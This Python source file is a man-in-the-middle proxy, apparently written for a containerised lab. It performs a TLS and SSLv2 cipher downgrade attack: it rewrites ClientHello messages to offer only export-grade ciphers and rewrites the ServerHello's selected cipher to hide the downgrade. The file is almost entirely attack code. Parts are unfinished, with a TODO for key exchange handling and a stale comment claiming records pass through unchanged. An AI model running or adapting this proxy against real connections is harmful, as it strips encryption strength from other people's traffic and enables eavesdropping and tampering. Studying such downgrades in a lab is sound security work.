import socket
import select
import time
import threading
import logging

from scapy.all import *
from scapy.layers.tls.all import *

LISTEN_HOST = '0.0.0.0'
LISTEN_PORT = 8443  # Port for browser to connect to proxy
SERVER_HOST = 'server'  # Docker Compose service name or IP
SERVER_PORT = 8443      # Real server port

EXPORT_CIPHERS = [ 0x0004, 0x0005, 0x0006, 0x0008, 0x0009, 0x0012, 0x0013, 0x0014, 0x0015 ]

logger = logging.getLogger("mitm-proxy")
if not logger.hasHandlers():
    logging.basicConfig(level=logging.INFO, format='[%(asctime)s] %(levelname)s: %(message)s')


ORIGINAL_CIPHER = 47

def parse_and_modify_clienthello(data):
    # Parse the TLS record
    logger.info("Parsing intercepted data")
    hello = TLSClientHello(data)

    logger.info("TLS ClientHello detected")
    logger.info("Original ciphers: %s", hello.ciphers)
    orig_len = len(hello.ciphers)
    # Modify the cipher suites to only include EXPORT ciphers
    # replace every cipher that is not in EXPORT_CIPHERS with cipher 8
    new_ciphers = []
    for cipher in hello.ciphers:
        if cipher in EXPORT_CIPHERS:
            new_ciphers.append(cipher)
        else:
            new_ciphers.append(0x0008)  # Replace with cipher 8
    hello.ciphers = new_ciphers
    logger.info("Modified ciphers: %s", hello.ciphers)
    return bytes(hello)

    return data

def parse_serverhello(data):
    # Parse the TLS record
    logger.info("Parsing intercepted server data")
    hello = TLSServerHello(data)
    logger.info("TLS ServerHello detected")
    logger.info("Server selected cipher: %s", hello.cipher)
    if ORIGINAL_CIPHER is not None:
        if hello.cipher == 0x0008:
            logger.info(f"Server accepted downgraded cipher 8, replacing with original cipher {ORIGINAL_CIPHER}")
            hello.cipher = ORIGINAL_CIPHER
        else:
            logger.warning(f"Server did not accept downgraded cipher, selected {hello.cipher} instead of 8")
    return bytes(hello)

def parse_serverkeyexchange(data):
    # Parse the TLS record
    logger.info("Parsing intercepted server key exchange data")
    # ske = TLSServerKeyExchange(data)
    # TODO

def recv_exact(sock, n):
    """Read exactly n bytes from a socket or return None if EOF."""
    buf = b''
    while len(buf) < n:
        # wait until socket is readable to avoid blocking forever
        ready = select.select([sock], [], [], 5.0)
        if not ready[0]:
            logger.warning("recv_exact timeout waiting for data")
            return None
        try:
            chunk = sock.recv(n - len(buf))
        except socket.timeout:
            logger.warning("recv_exact socket.timeout")
            return None
        if not chunk:
            return None
        buf += chunk
    return buf


def read_record(sock):
    """Read a single record from `sock`.

    Supports regular TLS records (5-byte header) and older SSLv2-style records
    (commonly produced by legacy OpenSSL ClientHello). Uses MSG_PEEK to
    inspect the first bytes and decide which header format to read so we don't
    block waiting for 5 bytes when the peer actually sent a 2-byte SSLv2 header.

    Returns a tuple (hdr_bytes, payload_bytes, record_kind) where record_kind is
    'tls' or 'sslv2'. Returns (None, None, None) on EOF.
    """
    # Peek at the first byte to decide
    # wait until at least 1 byte is available
    ready = select.select([sock], [], [], 5.0)
    if not ready[0]:
        # no data within timeout
        return (None, None, None)
    try:
        first = sock.recv(1, socket.MSG_PEEK)
    except (BlockingIOError, InterruptedError, socket.timeout):
        return (None, None, None)
    if not first:
        return (None, None, None)
    b0 = first[0]

    # Normal TLS record (ContentType in 20..24) -> 5 byte header
    if 20 <= b0 <= 24:
        hdr = recv_exact(sock, 5)
        if not hdr:
            return (None, None, None)
        rec_len = int.from_bytes(hdr[3:5], 'big')
        payload = recv_exact(sock, rec_len)
        if payload is None:
            return (None, None, None)
        return (hdr, payload, 'tls')

    # Otherwise, assume SSLv2 style header. Try two-byte header first
    # Two-byte SSLv2 header: first byte has MSB set -> 15-bit length
    # ensure two bytes are available for SSLv2 header detection
    ready = select.select([sock], [], [], 5.0)
    if not ready[0]:
        return (None, None, None)
    try:
        prefix = sock.recv(2, socket.MSG_PEEK)
    except (BlockingIOError, InterruptedError, socket.timeout):
        return (None, None, None)
    if not prefix or len(prefix) < 2:
        return (None, None, None)

    if prefix[0] & 0x80:
        # 2-byte header
        h = recv_exact(sock, 2)
        if not h:
            return (None, None, None)
        length = ((h[0] & 0x7F) << 8) | h[1]
        body = recv_exact(sock, length)
        if body is None:
            return (None, None, None)
        return (h, body, 'sslv2')
    else:
        # 3-byte header (rare). Read 3 bytes and interpret length from next two bytes
        h = recv_exact(sock, 3)
        if not h or len(h) < 3:
            return (None, None, None)
        length = (h[1] << 8) | h[2]
        body = recv_exact(sock, length)
        if body is None:
            return (None, None, None)
        return (h, body, 'sslv2')


def tls_record_type_name(content_type):
    mapping = {
        20: 'change_cipher_spec',
        21: 'alert',
        22: 'handshake',
        23: 'application_data',
        24: 'heartbeat',
    }
    return mapping.get(content_type, f'unknown({content_type})')


def tls_handshake_type_name(hstype):
    mapping = {
        0: 'hello_request',
        1: 'client_hello',
        2: 'server_hello',
        11: 'certificate',
        12: 'server_key_exchange',
        13: 'certificate_request',
        14: 'server_hello_done',
        15: 'certificate_verify',
        16: 'client_key_exchange',
        20: 'finished'
    }
    return mapping.get(hstype, f'handshake_unknown({hstype})')


def parse_sslv2_clienthello(body):
    """Parse SSLv2 ClientHello body and return a list of cipher specs.

    SSLv2 ClientHello layout (body):
      0: msg_type (1)
      1-2: version (2)
      3-4: cipher_spec_length (2)
      5-6: session_id_length (2)
      7-8: challenge_length (2)
      9.. : cipher_specs (cipher_spec_length bytes, 3 bytes each), session_id, challenge
    """
    if len(body) < 9:
        logger.warning("SSlv2 ClientHello too short")
        return []
    msg_type = body[0]
    if msg_type != 1:
        logger.info(f"SSLv2 message type {msg_type} not ClientHello")
        return []
    version = body[1:3]
    cs_len = int.from_bytes(body[3:5], 'big')
    sid_len = int.from_bytes(body[5:7], 'big')
    chal_len = int.from_bytes(body[7:9], 'big')
    offset = 9
    cs_bytes = body[offset:offset+cs_len]
    ciphers = []
    for i in range(0, len(cs_bytes), 3):
        spec = cs_bytes[i:i+3]
        if len(spec) < 3:
            continue
        # represent as hex and also map to TLS two-byte suite (last two bytes)
        spec_hex = spec.hex()
        tls_suite = int.from_bytes(spec[1:3], 'big')
        ciphers.append((spec_hex, tls_suite))
    logger.info(f"SSLv2 ClientHello version={version.hex()} ciphers={ciphers} session_id_len={sid_len} challenge_len={chal_len}")
    return ciphers


def modify_sslv2_clienthello(body, new_tls_suite=0x0004):
    """Return a modified SSLv2 ClientHello body where all cipher specs are
    replaced by the given TLS suite (repeated) while keeping lengths same.

    new_tls_suite is a 2-byte value (e.g. 0x0008). We build 3-byte specs as
    \x00 + suite (0x00 || suite) and repeat to match original cipher_spec_length.
    """
    if len(body) < 9:
        return body
    msg_type = body[0]
    if msg_type != 1:
        return body
    cs_len = int.from_bytes(body[3:5], 'big')
    # compute number of full 3-byte specs
    n_specs = cs_len // 3
    offset = 9
    orig_cs = body[offset:offset+cs_len]
    suite_bytes = int(new_tls_suite).to_bytes(2, 'big')
    new_cs_parts = []
    for i in range(0, n_specs):
        start = i*3
        orig_spec = orig_cs[start:start+3]
        if len(orig_spec) < 3:
            continue
        # preserve the original first byte (cipher kind) and replace last two bytes
        new_spec = orig_spec[0:1] + suite_bytes
        new_cs_parts.append(new_spec)
    new_cs_bytes = b''.join(new_cs_parts)
    # if there was a remainder, preserve original tail bytes
    rem = cs_len - (n_specs * 3)
    if rem:
        new_cs_bytes += orig_cs[-rem:]
    # rebuild body: header(0..8) + new_cs_bytes + rest
    rest = body[offset+cs_len:]
    new_body = body[:offset] + new_cs_bytes + rest
    logger.info(f"Modified SSLv2 ClientHello to offer TLS suite 0x{new_tls_suite:04x} repeated {n_specs} times")
    return new_body


def parse_sslv2_serverhello(body):
    """Parse SSLv2 ServerHello body and return the chosen cipher (if present).

    SSLv2 ServerHello layout (body):
      0: msg_type (1)
      1-2: cipher_spec_length (2)
      3-4: session_id_length (2)
      5-6: certificate_length (2)
      7.. : cipher_specs (cipher_spec_length bytes), session_id, certificate
    The server typically includes the selected cipher as the first 3-byte cipher_spec.
    """
    if len(body) < 7:
        logger.warning("SSLv2 ServerHello too short")
        return None
    msg_type = body[0]
    if msg_type != 4:
        logger.info(f"SSLv2 message type {msg_type} not ServerHello")
        return None
    cs_len = int.from_bytes(body[1:3], 'big')
    sid_len = int.from_bytes(body[3:5], 'big')
    cert_len = int.from_bytes(body[5:7], 'big')
    offset = 7
    cs_bytes = body[offset:offset+cs_len]
    chosen = None
    if len(cs_bytes) >= 3:
        spec = cs_bytes[0:3]
        spec_hex = spec.hex()
        tls_suite = int.from_bytes(spec[1:3], 'big')
        chosen = (spec_hex, tls_suite)
        logger.info(f"SSLv2 ServerHello chosen cipher spec={spec_hex} tls_suite=0x{tls_suite:04x}")
    else:
        logger.info("SSLv2 ServerHello contains no cipher specs")
    return chosen

def forward(src, dst, direction):
    try:
        while True:
            hdr, payload, kind = read_record(src)
            if hdr is None:
                break

            if kind == 'tls':
                content_type = hdr[0]
                rec_len = int.from_bytes(hdr[3:5], 'big')
                rtype_name = tls_record_type_name(content_type)
                logger.info(f"Record {direction}: {rtype_name}, len={rec_len}")

                # If it's a handshake record, try to parse handshake messages inside
                if content_type == 22:  # handshake
                    # handshake messages can be concatenated; walk them
                    offset = 0
                    while offset + 4 <= len(payload):
                        htype = payload[offset]
                        hlen = int.from_bytes(payload[offset+1:offset+4], 'big')
                        hname = tls_handshake_type_name(htype)
                        logger.info(f"  Handshake message: {hname}, len={hlen}")
                        if hname == 'client_hello':
                            new_payload = parse_and_modify_clienthello(payload[offset:offset+4+hlen])
                            payload = payload[:offset] + new_payload + payload[offset+4+hlen:]
                        elif hname == 'server_hello':
                            new_payload = parse_serverhello(payload[offset:offset+4+hlen])
                            payload = payload[:offset] + new_payload + payload[offset+4+hlen:]
                        elif hname == 'server_key_exchange':
                            parse_serverkeyexchange(payload[offset:offset+4+hlen])
                        #advance to next handshake message
                        offset += 4 + hlen
                        if hlen == 0:
                            break

            else:  # sslv2
                rec_len = len(payload)
                logger.info(f"Record {direction}: sslv2, len={rec_len}")
                #try to parse sslv2 handshake messages
                if len(payload) > 0:
                    msg_type = payload[0]
                    if msg_type == 1:  # ClientHello
                        ciphers = parse_sslv2_clienthello(payload)
                        logger.info(f"  SSLv2 ClientHello ciphers: {ciphers}")
                        # modify clienthello to only offer TLS cipher 0x0003 (export)
                        new_payload = modify_sslv2_clienthello(payload, new_tls_suite=0x0003)
                        payload = new_payload
                    elif msg_type == 4:  # ServerHello
                        chosen = parse_sslv2_serverhello(payload)
                        logger.info(f"  SSLv2 ServerHello chosen: {chosen}")

            # For now, forward the record unchanged 
            dst.sendall(hdr + payload)
    except Exception as e:
        logger.warning(f"Exception in forwarding ({direction}): {e}")
    finally:
        src.close()
        dst.close()

def handle_client(client_sock, client_addr):
    try:
        server_sock = socket.create_connection((SERVER_HOST, SERVER_PORT))
        logger.info(f"Accepted connection from {client_addr}, forwarding to {SERVER_HOST}:{SERVER_PORT}")
        threading.Thread(target=forward, args=(client_sock, server_sock, 'client->server')).start()
        threading.Thread(target=forward, args=(server_sock, client_sock, 'server->client')).start()
    except Exception as e:
        logger.error(f"Error handling client {client_addr}: {e}")
        client_sock.close()

def main():
    listen_sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    listen_sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    listen_sock.bind((LISTEN_HOST, LISTEN_PORT))
    listen_sock.listen(5)
    logger.info(f"Proxy listening on {LISTEN_HOST}:{LISTEN_PORT}, forwarding to {SERVER_HOST}:{SERVER_PORT}")
    while True:
        client_sock, addr = listen_sock.accept()
        logger.info(f"Accepted connection from {addr}")
        threading.Thread(target=handle_client, args=(client_sock, addr)).start()

if __name__ == '__main__':
    main()